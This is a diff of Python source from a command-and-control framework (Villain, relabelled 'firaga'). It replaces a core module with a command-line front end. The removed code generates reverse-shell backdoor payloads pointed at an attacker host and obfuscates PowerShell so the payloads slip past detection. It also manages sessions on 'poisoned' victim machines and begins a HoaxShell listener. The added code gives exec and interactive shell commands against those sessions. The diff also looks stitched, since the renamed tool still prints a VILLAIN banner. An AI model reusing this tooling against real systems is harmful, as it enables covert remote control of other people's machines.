@@ -1,1745 +1,802 @@
 #!/usr/bin/env python3
 #
-# Author: Panagiotis Chartas (t3l3machus) | https://github.com/t3l3machus
-#
-# This script is part of the Villain framework.
+# Author: Panagiotis Chartas (t3l3machus) 
+# Source: https://github.com/t3l3machus/firaga
+# This script is part of the firaga framework.
 
 
-import ssl, sys, argparse, base64, re, os, socket, struct
-import netifaces as ni
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from warnings import filterwarnings
-from datetime import date, datetime
-from IPython.display import display
-from threading import Thread, BoundedSemaphore
-from time import sleep, time
-from ipaddress import ip_address
-from subprocess import check_output
-from string import ascii_uppercase, ascii_lowercase
+import os, sys, argparse, re, threading, keyboard, rlcompleter
+from threading import Thread
+from importlib import import_module
+from subprocess import DEVNULL, STDOUT, check_call, check_output, run
 from pyperclip import copy as copy2cb
-from uuid import uuid4
-from ast import literal_eval
-from random import randint, choice, randrange
-from .common import *
-from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Hoaxshell_settings
-
-filterwarnings("ignore", category = DeprecationWarning)
+from time import sleep, time
+from Core.common import *
+from Core.settings import Hoaxshell_settings, Core_server_settings
+from string import ascii_uppercase, ascii_lowercase, digits
 
 
-class Payload_generator:
+# -------------- Arguments -------------- #
+parser = argparse.ArgumentParser()
+
+parser.add_argument("-p", "--port", action="store", help = "Core server port (default: 65001).", type = int)
+parser.add_argument("-x", "--hoax-port", action="store", help = "HoaxShell server port (default: 8080 via http, 443 via https).", type = int)
+parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for HoaxShell https server).")
+parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for HoaxShell https server).")
+parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
+parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
+
+args = parser.parse_args()
+
+Hoaxshell_settings.certfile = args.certfile
+Hoaxshell_settings.keyfile = args.keyfile
+Hoaxshell_settings.ssl_support = True if (args.certfile and args.keyfile) else False
+Hoaxshell_settings.bind_port = args.hoax_port if args.hoax_port else Hoaxshell_settings.bind_port
+
+if Hoaxshell_settings.ssl_support:
+	Hoaxshell_settings.bind_port_ssl = args.hoax_port if args.hoax_port else Hoaxshell_settings.bind_port_ssl
+	
+Core_server_settings.bind_port = args.port if args.port else Core_server_settings.bind_port
+
+from Core.firaga_core import Payload_generator, initiate_hoax_server, Sessions_manager, Hoaxshell, Core_server
 
 
+# -------------- Functions & Classes -------------- #
+
+def print_banner():
+	
+	print('\r')
+	padding = '  '
+
+	F = [[' ', '┌','─','┬'], [' ', '├','┤',' '], [' ', '└',' ',' ']]
+	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
+	R = [[' ', '┬','─','┐'], [' ', '├','┬','┘'], [' ', '┴','└','─']]
+	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]	
+	G = [[' ', '┌','─','┐'], [' ', '│',' ','┬'], [' ', '└','─','┘']]
+	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
+
+	
+	V = [[' ', '┬', ' ', ' ', '┬'], [' ', '└','┐','┌', '┘'], [' ', ' ','└','┘', ' ']]
+	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
+	L = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]	
+	L2 = [['┬',' ',' '], ['│',' ', ' '], ['┴','─','┘']]	
+	A = [['┌','─','┐'], ['├','─','┤'], ['┴',' ','┴']]
+	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
+	N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]	
+
+	# ~ banner = [F,I,R,A,G,A]
+	banner = [V,I,L,L2,A,I,N]
+	final = []	
+	init_color = 97 #89 #97
+	# ~ init_color = 3
+	txt_color = init_color
+	cl = 0
+		
+	for charset in range(0, 3):
+		for pos in range(0, len(banner)):
+			for i in range(0, len(banner[pos][charset])):
+				clr = f'\033[38;5;{txt_color}m'
+				char = f'{clr}{banner[pos][charset][i]}'
+				final.append(char)
+				cl += 1
+				txt_color = txt_color + 36 if cl <= 3 else txt_color
+
+			cl = 0
+
+			txt_color = init_color
+		# ~ init_color += 30
+		init_color += 1
+
+		if charset < 2: final.append('\n   ')
+
+	print(f"   {''.join(final)}")
+	print(f'{END}{padding}           by t3l3machus\n')
+
+
+
+class PrompHelp:
+	
+	commands = {
+	
+		'connect' : {
+			'details' : f''' 			
+			\r  Connect with another machine running firaga (sibling server). Once connected, you will be able 
+			\r  to see and interact with all connected sibling servers' shell sessions and vice-versa.
+				
+			\r  {ORANGE}connect <IP> <CORE_SERVER_PORT>{END}
+			''',
+			'least_args' : 2,
+			'max_args' : 2
+		},
+		
+		
+		'generate' : {
+			'details' : f''' 			
+			\r  Generate backdoor payload. If you start firaga over SSL the generated payload(s) 
+			\r  will be adjusted accordingly. 
+				
+			\r  {BOLD}For Windows{END}:
+			\r  {ORANGE}generate os=windows lhost=<IP or INTERFACE> [ exec_outfile=<REMOTE PATH> domain=DOMAIN] [ obfuscate encode constraint_mode ]{END}
+
+			\r  Use exec_outfile to write & execute commands from a specified file on the victim (instead of using IEX):
+			\r  {ORANGE}generate os=windows lhost=eth0 exec_outfile="C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1{END}"
+
+			\r  {BOLD}For Linux{END}:
+			\r  {ORANGE}generate os=linux lhost=<IP or INTERFACE>{END}
+			''',
+			'least_args' : 2,
+			'max_args' : 7
+		},			
+
+		'exec' : {
+			'details' : f''' 			
+			\r  Execute command or file against an active shell session. 
+				
+			\r  {ORANGE}exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>{END}
+			
+			\r  *Command(s) should be quoted.
+			''',
+			'least_args' : 2,
+			'max_args' : 2
+		},			
+
+			
+		'shell' : {
+			'details' : f''' 			
+			\r  Enable an interactive pseudo-shell for a session. Press Ctrl+C to disable.
+				
+			\r  {ORANGE}shell <SESSION ID or ALIAS>{END}
+			''',
+			'least_args' : 1,
+			'max_args' : 1
+		},			
+
+			
+		'alias' : {
+			'details' : f'''
+			\r  Create an alias to use instead of session ID.
+				
+			\r  {ORANGE}alias <ALIAS> <SESSION ID>{END}
+			''',
+			'least_args' : 2,
+			'max_args' : 2
+		},			
+
+			
+		'reset' : {
+			'details' : f'''
+			\r  Reset a given alias to the original session ID.
+				
+			\r  {ORANGE}reset <ALIAS>{END}
+			''',
+			'least_args' : 1,
+			'max_args' : 1
+		},			
+
+		
+		'kill' : {
+			'details' : f'''
+			\r  Terminate a self-owned shell session.
+				
+			\r  {ORANGE}kill <SESSION ID or ALIAS>{END}
+			''',
+			'least_args' : 1,
+			'max_args' : 1
+		},		
+
+		
+		'help' : {
+			'details' : f'''
+			\r  Really?
+			''',
+			'least_args' : 0,
+			'max_args' : 1
+		},
+
+		'siblings' : {
+			'details' : f'''
+			\r  Siblings are basically other instances of firaga that you've connected with.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'sessions' : {
+			'details' : f'''
+			\r  Sessions of backdoored machines that you have succesfully poisoned.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'id' : {
+			'details' : f'''
+			\r  Print server's unique ID.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'exit' : {
+			'details' : f'''
+			\r  Kill all sessions and quit.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'clear' : {
+			'details' : f'''
+			\r  Come on man.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+	
+	}
+	
+	
+	@staticmethod
+	def print_main_help_msg():
+				
+		print(
+		f'''
+		\r  Command          Description
+		\r  -------          -----------
+		\r  help     [+]     Print this message.
+		\r  connect  [+]     Connect with sibling server.
+		\r  generate [+]     Generates backdoor payload.
+		\r  siblings         Print sibling servers data table.
+		\r  sessions         Print established backdoor sessions data table.
+		\r  exec     [+]     Execute command/file against session.
+		\r  shell    [+]     Enable interactive hoaxshell for session.
+		\r  alias    [+]     Set an alias for a shell session.
+		\r  reset    [+]     Reset alias back to session ID.
+		\r  kill     [+]     Terminate an established shell session.
+		\r  id               Print server's unique ID (self).
+		\r  clear            Clear screen.
+		\r  exit             Kill all sessions and quit.
+		
+        \r  Commands with [+] may require additional arguments.
+        \r  For details use: {ORANGE}help <COMMAND>{END}
+		''')
+			
+
+
+	@staticmethod
+	def print_detailed(cmd):			
+		print(PrompHelp.commands[cmd]['details']) if cmd in PrompHelp.commands.keys() else print(f'No details for command "{cmd}".')
+
+
+
+	@staticmethod
+	def validate(cmd, num_of_args):
+		
+		valid = True
+		
+		if cmd not in PrompHelp.commands.keys():
+			print('Unknown command.')
+			valid = False
+			
+		elif num_of_args < PrompHelp.commands[cmd]['least_args']:
+			print('Missing arguments.')
+			valid = False
+		
+		elif num_of_args > PrompHelp.commands[cmd]['max_args']:
+			print('Too many arguments.')
+			valid = False			
+	
+		return valid
+
+	
+
+def alias_sanitizer(word, _min = 2, _max = 26):
+	
+	length = len(word)
+	
+	if length >= _min and length <= _max:
+	
+		valid = ascii_uppercase + ascii_lowercase + '-_' + digits
+		
+		for char in word:		
+			if char not in valid:
+				return [f'Alias includes illegal character: "{char}".']
+		
+		return word
+				
+	else:
+		return ['Alias length must be between 2 to 26 characters.']
+		
+	
+	
+# Tab auto-completer          
+class Completer(object):
+	
 	def __init__(self):
 		
-		self.obfuscator = Obfuscator()
+		self.tab_counter = 0		
+		self.main_prompt_commands = PrompHelp.commands.keys()	
+		self.generate_arguments = ['os', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
+		'trusted_domain', 'exec_outfile', 'execpoutsa']
+	
+	
+	
+	def reset_counter(self):	
+		sleep(0.4)
+		self.tab_counter = 0
 		
-		self.boolean_args = {
-			'encode' : False,
-			'obfuscate' : False,		
-			'constraint_mode' : False
-		}
+	
+	
+	def get_possible_cmds(self, cmd_frag):
 		
-		self.supported = {
-			'linux' : ['domain'],
-			'windows' : ['domain', 'encode', 'obfuscate', 'constraint_mode', 'exec_outfile']
-		}
-
-
-	def encodeUTF16(self, payload):
-		enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-		return enc_payload
-
-
-
-	def args_to_dict(self, args_list):
+		matches = []
 		
-		try:
-			args_dict = {}
+		for cmd in self.main_prompt_commands:
+			if re.match(f"^{cmd_frag}", cmd):
+				matches.append(cmd)
+		
+		return matches
+		
+		
+		
+	def get_match_from_list(self, cmd_frag, wordlist):
+		
+		matches = []
+		
+		for w in wordlist:
+			if re.match(f"^{cmd_frag}", w):
+				matches.append(w)
+		
+		if len(matches) == 1:
+			return matches[0]
+		
+		elif len(matches) > 1:
 			
-			for arg in args_list:
+			char_count = 0
+			
+			while True:
+				char_count += 1
+				new_search_term_len = (len(cmd_frag) + char_count)
+				new_word_frag = matches[0][0:new_search_term_len]
+				unique = []
 				
-				try:
-					tmp = arg.split("=")
-					args_dict[tmp[0].lower()] = tmp[1]
+				for m in matches:
 					
-				except:
-					args_dict[tmp[0].lower()] = True
-			
-			return args_dict
-		
-		except:
-			return None
-	
-
-
-	def read_file(self, path):
-		
-		f = open(path, 'r')
-		content = f.read()
-		f.close()
-		return content
-
-	
-	
-	def generate_payload(self, args_list):
-		
-		try:
-
-			args_dict = self.args_to_dict(args_list)
-			arguments = args_dict.keys()
-			
-			if not args_dict:
-				print('Error parsing arguments. Check your input and try again.')
-				return
+					if re.match(f"^{new_word_frag}", m):
+						unique.append(m)		
+				
+				if len(unique) < len(matches):
 					
-
-			''' Parse OS '''
-			if 'os' in arguments:
-				if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
-					os_type = args_dict['os'].lower()
+					if self.tab_counter <= 1:
+						return new_word_frag[0:-1]
+						
+					else:						
+						print_shadow('\n' + '  '.join(matches))
+						Main_prompt.rst_prompt()
+						return False 
+				
+				elif len(unique) == 1:
+					return False
 				
 				else:
-					print('Unsupported OS type.')
-					return		
-				
-			else:
-				print('Required argument OS not provided.')
-				return
-		
-			
-			''' Parse LHOST '''
-			if ('lhost' in arguments):
-				
-				try:
-					# Check if valid IP address
-					lhost = str(ip_address(args_dict['lhost']))
+					continue
 					
-				except ValueError:
-					
-					try:
-						# Check if valid interface
-						lhost = ni.ifaddresses(args_dict['lhost'])[ni.AF_INET][0]['addr']
-						
-					except:
-						print('Error parsing LHOST. Invalid IP or Interface.')
-						return
-						
-			else:
+		else:
+			return False
 				
-				if (not Hoaxshell_settings.ssl_support) or ('domain' not in arguments):
-					print('Required argument LHOST not provided.') if not Hoaxshell_settings.ssl_support \
-					else print('Required argument LHOST or DOMAIN not provided.')
-					return
-				
-			frequency = Hoaxshell_settings.default_frequency
-			
-
-			''' Parse EXEC_OUTFILE '''		
-			if 'exec_outfile' in arguments:
-				
-				if 'exec_outfile' in self.supported[args_dict['os']]:
-					exec_outfile = args_dict['exec_outfile']
-						
-				else:					
-					exec_outfile = False
-					print(f'Ignoring argument "exec_outfile" (not supported for {args_dict["os"]} payloads)')
-			else:
-				exec_outfile = False
 
 
-
-			''' Parse DOMAIN '''		
-			if 'domain' in arguments:
-				
-				if not Hoaxshell_settings.ssl_support:
-					domain = False
-					print('Hoaxshell server must be started with SSL support to use a domain.')
-					return
-				
-				if 'domain' in self.supported[args_dict['os']]:
-					domain = args_dict['domain']
-						
-				else:					
-					domain = False
-					print(f'Ignoring argument "domain" (not supported for {args_dict["os"]} payloads)')
-			else:
-				domain = False
-
-
-
-			''' Parse BOOLEAN '''			
-			for item in self.boolean_args.keys():
-				if item in arguments:
-					if item in self.supported[os_type]:
-						self.boolean_args[item] = True
-
-					else:
-						print(f'Ignoring argument "{item}" (not supported for {os_type} payloads)')
+	def update_prompt(self, typed, new_content, lower = False):
+		readline.insert_text(new_content[typed:])			
+	
+	
+	
+	def complete(self, text, state):
 		
-			
-			if (os_type == 'linux'):
-				self.boolean_args['constraint_mode'] = True
-				self.boolean_args['trusted_domain'] = False
-			
-			
-			# Create session unique id
-			verify = str(uuid4())[0:8]
-			get_cmd = str(uuid4())[0:8]
-			post_res = str(uuid4())[0:8]
-			hid = str(uuid4()).split("-")
-			header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Hoaxshell_settings._header else Hoaxshell_settings._header
-			session_unique_id = '-'.join([verify, get_cmd, post_res])
-
-			# Define lhost
-			if not domain:
-				lhost = f'{lhost}:{Hoaxshell_settings.bind_port}' if not Hoaxshell_settings.ssl_support \
-				else f'{lhost}:{Hoaxshell_settings.bind_port_ssl}'
-			else:
-				lhost = f'{domain}:{Hoaxshell_settings.bind_port_ssl}'
-
-			print(f'Generating reverse shell payload...')
-									  
-			# Select base template
-			if Hoaxshell_settings.ssl_support:
-				payload = self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload') \
-				if not exec_outfile else self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload_outfile')									  
-			else:
-				payload = self.read_file(f'{cwd}/payload_templates/{os_type}/http_payload') \
-				if not exec_outfile else self.read_file(f'{cwd}/payload_templates/{os_type}/http_payload_outfile')
-			
-			# Process payload template 
-			payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
-				frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id).strip()
-						
-			if exec_outfile:
-				payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
-			
-			if self.boolean_args['constraint_mode']:
-				payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
-
-			if not domain and Hoaxshell_settings.ssl_support:
-				disable_ssl_chk = self.read_file(f'{cwd}/payload_templates/{os_type}/disable_ssl_check')
-				payload = payload.replace('*DISABLE_SSL_CHK*', disable_ssl_chk)
-			
-			elif domain and Hoaxshell_settings.ssl_support:
-				payload = payload.replace('*DISABLE_SSL_CHK*', '')
-			
-			Sessions_manager.legit_session_ids[session_unique_id] = {
-				'OS Type' : args_dict['os'].capitalize(),
-				'constraint_mode' : self.boolean_args['constraint_mode'],
-				'frequency' : frequency,
-				'exec_outfile' : exec_outfile if exec_outfile else False
-			}
-			
-			payload = self.obfuscator.mask_payload(payload) if self.boolean_args['obfuscate'] else payload
-			payload = self.encodeUTF16(payload) if self.boolean_args['encode'] else payload
-			
-			print(f'{PLOAD}{payload}{END}')
-			copy2cb(payload)
-			print(f'{ORANGE}Copied to clipboard!{END}')
-			
-		except:
-			print('Error parsing arguments. Check your input and try again.')
+		self.tab_counter += 1
+		line_buffer_val = readline.get_line_buffer().strip()
+		lb_list = re.sub(' +', ' ', line_buffer_val).split(' ')
+		lb_list_len = len(lb_list) if lb_list != [''] else 0
+		
+		# Return no input or input already matches a command
+		if (lb_list_len == 0):
 			return
+			
+
+		# Get prompt command from word fragment
+		elif lb_list_len == 1:
+					
+			match = self.get_match_from_list(lb_list[0].lower(), self.main_prompt_commands)
+			self.update_prompt(len(lb_list[0]), match) if match else chill()
+		
+		
+		
+		# Autocomplete session IDs
+		elif (lb_list[0].lower() in ['exec', 'alias', 'kill', 'shell']) and (lb_list_len > 1) and (lb_list[-1][0] != "/"):
+			
+			if lb_list[-1] in Sessions_manager.active_sessions.keys():
+				pass
+			
+			else:				
+				word_frag = lb_list[-1]
+				match = self.get_match_from_list(lb_list[-1], Sessions_manager.active_sessions.keys())
+				self.update_prompt(len(lb_list[-1]), match) if match else chill()
 
 
 
-class Obfuscator:
+		# Autocomplete generate prompt command arguments
+		elif (lb_list[0].lower() == 'generate') and (lb_list_len > 1):
+									
+			word_frag = lb_list[-1].lower()
+			match = self.get_match_from_list(lb_list[-1], self.generate_arguments)
+			self.update_prompt(len(lb_list[-1]), match, lower = True) if match else chill()
+
+
+
+		# Autocomplete help
+		elif (lb_list[0].lower() == 'help') and (lb_list_len > 1):
+									
+			word_frag = lb_list[-1].lower()
+			match = self.get_match_from_list(lb_list[-1], self.main_prompt_commands)
+			self.update_prompt(len(lb_list[-1]), match, lower = True) if match else chill()
+
+		
+
+		# Autocomplete paths
+		elif (lb_list[0].lower() in ['exec', 'host']) and (lb_list_len > 1) and (lb_list[-1][0] == "/"):
+			
+			root = '/'
+			search_term = lb_list[-1]
+			
+			# Check if root or subdir
+			path_level = search_term.split('/')
+			
+			if re.search('/', search_term) and len(path_level) > 1:
+				search_term	= path_level[-1]
+				
+				for i in range(0, len(path_level)-1):
+					root += f'/{path_level[i]}'
+				
+			dirs = next(os.walk(root))[1]
+			match = [d + '/' for d in dirs if re.match(f'^{search_term}', d)]
+			files = next(os.walk(root))[2]
+			match += [f for f in files if re.match(f'^{search_term}', f)]
+			
+			# Appending match substring 
+			if len(match) == 1:
+				typed = len(search_term)
+				readline.insert_text(match[0][typed:])
+				self.tab_counter = 0
+				
+			# Print all matches
+			elif len(match) > 1 and self.tab_counter > 1:
+				print_shadow('\n' + '  '.join(match))
+				self.tab_counter = 0
+				Main_prompt.rst_prompt()
+						
+		# Reset tab counter after 0.5s of inactivity
+		threading.Thread(name="reset_counter", target=self.reset_counter).start()
+		return
+		
+
 	
-	def __init__(self):
-		
-		self.restricted_var_names = ['t', 'tr', 'tru', 'true', 'e', 'en', 'env']
-		self.used_var_names = []
+def main():
+
+	chill() if args.quiet else print_banner()
+	cwd = os.path.dirname(os.path.abspath(__file__))
 	
-	
-	def mask_char(self, char):
-		
-		path = randint(1,3)
-			
-		if char.isalpha():
-			
-			if path == 1: 
-				return char
-			
-			return '\w' if path == 2 else f'({char}|\\?)'
-		
-		
-		
-		elif char.isnumeric():
+	''' Update utility '''
+	if args.update:
 
-			if path == 1: 
-				return char
-			
-			return '\d' if path == 2 else f'({char}|\\?)'
-		
-		
-		
-		elif char in '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~':
-			
-			if char in ['$^*\\+?']:
-				char = '\\' + char
-				
-			if path == 1: 
-				return char
-			
-			return '\W' if path == 2 else f'({char}|\\?)'
-		
-		else:
-			return None
+		updated = False
 
+		try:
 
+			print(f'[{INFO}] Pulling changes from the master branch...')
+			u = check_output(f'cd {cwd}&&git pull https://github.com/t3l3machus/firaga main', shell=True).decode('utf-8')
 
-	def randomize_case(self, string):
-		return ''.join(choice((str.upper, str.lower))(c) for c in string)
+			if re.search('Updating', u):
+				print(f'[{INFO}] Update completed! Please, restart firaga.')
+				updated = True
 
-
-	
-	def string_to_regex(self, string):
-		
-		# First check if string is actually a regex string
-		if re.match( "^\[.*\}$", string):
-			return string
-			
-		else:
-			
-			legal = False
-			
-			while not legal:
-				regex = ''
-				str_length = len(string)
-				chars_used = 0
-				c = 0
-				
-				while True:
-
-					chars_left = (str_length - chars_used)			
-					
-					if chars_left:
-						
-						pair_length = randint(1, chars_left)
-						regex += '['
-						
-						for i in range(c, pair_length + c):
-
-							masked = self.mask_char(string[i])
-							regex += masked
-							c += 1
-							
-						chars_used += pair_length
-						
-						regex += ']{' + str(pair_length) + '}'
-
-					else:
-						break
-				
-				# Test generated regex
-				if re.match(regex, string):
-					legal = True
-			
-			return regex
-
-
-
-	def concatenate_string(self, string):
-		
-		str_length = len(string)
-		
-		if str_length <= 1:
-			return string
-			
-		concat = ''
-		str_length = len(string)
-		chars_used = 0
-		c = 0
-		
-		while True:
-
-			chars_left = (str_length - chars_used)			
-			
-			if chars_left:
-				
-				pair_length = randint(1, chars_left)
-				concat += "'"
-				
-				for i in range(c, pair_length + c):
-
-					concat += string[i]
-					c += 1
-					
-				chars_used += pair_length				
-				concat = (concat + "'+") if (chars_used < str_length) else (concat + "'")
-
-			else:
-				break	
-	
-		return concat
-
-
-
-	def get_random_str(self, main_str, substr_len):
-		
-		index = randrange(1, len(main_str) - substr_len + 1) 
-		return main_str[index : (index + substr_len)]
-
-
-
-	def obfuscate_cmdlet(self, main_str):
-		
-		main_str_length = len(main_str)
-		substr_len = main_str_length - (randint(1, (main_str_length - 2)))
-		sub = self.get_random_str(main_str, substr_len)
-		sub_quoted = f"'{sub}'"
-		obf_cmdlet = main_str.replace(sub, sub_quoted)
-		return obf_cmdlet		
-
-
-
-	def get_rand_var_name(self):
-		
-		_max = randint(1,6)
-		legal = False
-		
-		while not legal:
-			
-			obf = str(uuid4())[0:_max]
-			
-			if (obf in self.restricted_var_names) or (obf in self.used_var_names):
-				continue
-				
-			else:
-				self.used_var_names.append(obf)
-				legal = True
-		
-		return obf
-		
-			
-
-	def mask_payload(self, payload):
-		
-		# Obfuscate variable name definitions
-		variables = re.findall("\$[A-Za-z0-9_]*={1}", payload)
-		
-		if variables:
-						
-			for var in variables:				
-				var = var.strip("=")	
-				obf = self.get_rand_var_name()
-				payload = payload.replace(var, f'${obf}')
-
-
-		# Randomize error variable name
-		obf = self.get_rand_var_name()
-		payload = payload.replace('-ErrorVariable e', f'-ErrorVariable {obf}')
-		payload = payload.replace('$e+', f'${obf}+')
-		
-		
-		# Obfuscate strings
-		strings = re.findall(r"'(.+?)'", payload)
-		
-		if strings:
-			for string in strings:
-				if string not in ['', ' ']:
-					
-					string_length = len(string)
-					method = randint(0, 1)
-						
-					if method == 0: # String to regex
-						
-						_max = randint(3,8)
-						random_string = str(uuid4())[0:_max]				
-						regex = self.string_to_regex(random_string)
-						replace_obf = self.randomize_case('-replace')
-						payload = payload.replace(f"'{string}'", f"$('{random_string}' {replace_obf} '{regex}','{string}')")
-					
-					elif method == 1: # Concatenate string
-						
-						submethod = randint(0, 1)
-						string = string.strip("'")
-						concat = self.concatenate_string(string)
-						
-						if submethod == 0: # return raw
-							payload = payload.replace(f"'{string}'", concat)
-							
-						elif submethod == 1: # return call
-							payload = payload.replace(f"'{string}'", f"$({concat})")
-					
-		
-					
-		# Randomize the case of each char in parameter names
-		ps_parameters = re.findall("\s-[A-Za-z]*", payload)
-
-		if ps_parameters:		
-			for param in ps_parameters:			
-				param = param.strip()
-				rand_param_case = self.randomize_case(param)
-				payload = payload.replace(param, rand_param_case)
-
-
-
-		# Spontaneous replacements
-		alternatives = {
-			'Invoke-WebRequest' : 'iwr',
-			'Invoke-Expression' : 'iex',
-			'Invoke-RestMethod' : 'irm'
-		}
-		
-		for alt in alternatives.keys():
-			
-			p = randint(0,1)
-			
-			if p == 0:
-				payload = payload.replace(alt, alternatives[alt])
-				
-			else:
+			elif re.search('Already up to date', u):
+				print(f'[{INFO}] Already running the latest version!')
 				pass
 
-
-
-		# Randomize char case of specified components
-		components = ['USERNAME', 'COMPUTERNAME', 'Out-String', 'Invoke-WebRequest', 'iwr', \
-		'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', \
-		'Invoke-RestMethod', 'irm', 'Start-Process', 'Hidden']
-	
-		for i in range(0, len(components)):
-			rand_case = self.randomize_case(components[i])
-			payload = payload.replace(components[i], rand_case)
-			components[i] = rand_case
-		
-		
-		# Obfuscate cmdlets
-		for i in range(0, len(components)):
-			if (components[i].count('.') == 0) and components[i].lower() not in ['while', 'username', 'computername']:
-				obf_cmdlet = self.obfuscate_cmdlet(components[i])
-				payload = payload.replace(components[i], obf_cmdlet)
-		
-		self.used_var_names = []
-		return payload
-		
-
-
-
-class Sessions_manager:
-	
-	active_sessions = {}
-	legit_session_ids = {}
-	
-	def list_sessions(self):
-		
-		if self.active_sessions.keys():
-			
-			print('\r')			
-			table = self.sessions_dict_to_list()
-			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'User', 'Owner', 'Status'])			
-			print('\r')
-		
-		else:
-			print(f'No active sessions.')
-
-
-
-	def sessions_dict_to_list(self):
-		
-		sessions_list = []
-		active_sessions_clone = self.active_sessions.copy()
-		
-		for session_id in active_sessions_clone:
-			
-			tmp = active_sessions_clone[session_id]
-			corrupted = 0
-			
-			try:
-				tmp['Session ID'] = session_id if not tmp['aliased'] else tmp['alias']
-				tmp['Owner'] = 'Self' if tmp['self_owned'] else Core_server.sibling_servers[tmp['Owner']]['Hostname']
-				tmp['User'] = f"{tmp['Computername']}\\{tmp['Username']}" if tmp['OS Type'] == 'Windows' else f"{tmp['Username']}@{tmp['Computername']}"
-				sessions_list.append(tmp)
-				
-			except KeyError:
-				corrupted += 1
-			
-		if corrupted:
-			print(f'\r[{WARN}] {corrupted} x Corrupted session data entries omitted.')
-			print(f'[{WARN}] Possible reason: Incomplete payload execution on victim.\n')
-				
-		return sessions_list
-		
-
-
-	@staticmethod
-	def return_session_owner_id(session_id):
-		
-		if session_id in Sessions_manager.active_sessions.keys():
-			return Sessions_manager.active_sessions[session_id]['Owner']
-		
-		else:
-			return None
-			
-
-	@staticmethod
-	def alias_to_session_id(alias):
-
-		active_sessions_clone = Sessions_manager.active_sessions.copy()
-		active_sessions = active_sessions_clone.keys()
-		
-		for session_id in active_sessions:
-			if Sessions_manager.active_sessions[session_id]['aliased']:
-				if Sessions_manager.active_sessions[session_id]['alias'] == alias:
-					return session_id
-		
-		return alias
-
-
-
-	def kill_session(self, session_id):
-		
-		if session_id in self.active_sessions.keys():
-			if self.active_sessions[session_id]['Owner'] == 'Self':
-				Hoaxshell.dropSession(session_id)
-				sleep(Hoaxshell_settings.default_frequency)
-				self.active_sessions.pop(session_id, None)
-				self.legit_session_ids.pop(session_id, None)
-				session_id_components = session_id.split('-')
-				Hoaxshell.verify.remove(session_id_components[0])
-				Hoaxshell.get_cmd.remove(session_id_components[1])
-				Hoaxshell.post_res.remove(session_id_components[2])
-				print(f'[{INFO}] Session terminated.')
-				Core_server.announce_session_termination({'session_id' : session_id})
-				
 			else:
-				print(f'[{FAILED}] Permission denied (session owned by sibling).')
-			
-		else:
-			print('Session invalid.')
+				print(f'[{FAILED}] Something went wrong. Are you running firaga from your local git repository?')
+				print(f'[{DEBUG}] Consider running "git pull https://github.com/t3l3machus/firaga main" inside the project\'s directory.')
 
-
-# -------------- Hoaxshell Server -------------- #
-class Hoaxshell(BaseHTTPRequestHandler):
-	
-	header_id = Hoaxshell_settings._header
-	server_unique_id = None
-	command_pool = {}
-	verify = []
-	get_cmd = []
-	post_res = []
-	
-	# Shell 
-	active_shell = None
-	prompt_ready = True
-	hoax_prompt = None
-	
-
-	@staticmethod
-	def set_shell_prompt_ready():
-		Hoaxshell.prompt_ready = True
-
-
-
-	def search_output_for_signature(self, output):
-		
-		try:
-			sibling_server_id = re.findall("{[a-zA-Z0-9]{32}}", output)[-1].strip("{}")
-		
 		except:
-			sibling_server_id = None
-		
-		return sibling_server_id
+			print(f'[{FAILED}] Update failed. Consider running "git pull https://github.com/t3l3machus/firaga main" inside the project\'s directory.')
 
-
-	
-	def cmd_output_interpreter(self, output, constraint_mode = False):
-		
-		try:
-				
-			if constraint_mode:
-				output = output.decode('utf-8', 'ignore')
-				
-			else:			
-				
-				bin_output = output.decode('utf-8').split(' ')
-				to_b_numbers = [ int(n) for n in bin_output ]
-				b_array = bytearray(to_b_numbers)
-				output = b_array.decode('utf-8', 'ignore')
-
-			# Check if command was issued by a sibling server
-			sibling_signature = self.search_output_for_signature(output)
-			
-			if sibling_signature:
-				output = output.replace('{' + sibling_signature + '}', '')
-								
-			
-		except UnicodeDecodeError:
-			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
-
-		if isinstance(output, bytes):
-			output = str(output)
-
-		else:
-			output = output.strip() + '\n' if output.strip() != '' else output.strip()
-		
-		return output if not sibling_signature else [sibling_signature, output]
-
-
-
-	@staticmethod
-	def activate_shell_session(session_id, os_type):
-
-		# Check if session id has alias
-		session_id = Sessions_manager.alias_to_session_id(session_id)
-		
-		session_data = Sessions_manager.active_sessions[session_id]
-		is_remote_shell = True if not session_data['self_owned'] else False	
-		
-		if is_remote_shell:
-					
